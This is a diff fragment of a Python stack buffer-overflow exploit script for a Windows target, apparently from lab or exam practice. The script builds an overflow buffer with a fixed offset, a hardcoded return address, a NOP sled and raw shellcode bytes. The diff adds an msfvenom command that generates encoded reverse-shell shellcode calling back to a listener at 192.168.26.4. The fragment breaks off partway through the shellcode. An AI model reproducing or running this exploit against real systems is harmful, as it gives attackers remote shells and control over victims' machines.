@@ -11,9 +11,12 @@ signal.signal(signal.SIGINT, def_handler)
 def buffer():
     offset = 1788
     buffer = b'A' * offset
+    #change the address here
     buffer += p32(0x77720ad0)
     buffer += b'\x90' * 200
     #BADCHARS -> \x00\x0d\x80
+    # msfvenom -p windows/shell_reverse_tcp LHOS=192.168.26.4 LPORT=4443 -a x86 --platform windows -b "\x00\x0d\x80" -e x86/shikata_ga_nai -f c
+    #change your shellcode here
     shellcode = (b"\xbb\xfa\xe5\x16\x3e\xda\xd0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
 b"\x52\x83\xe8\xfc\x31\x58\x0e\x03\xa2\xeb\xf4\xcb\xae\x1c\x7a"
 b"\x33\x4e\xdd\x1b\xbd\xab\xec\x1b\xd9\xb8\x5f\xac\xa9\xec\x53"
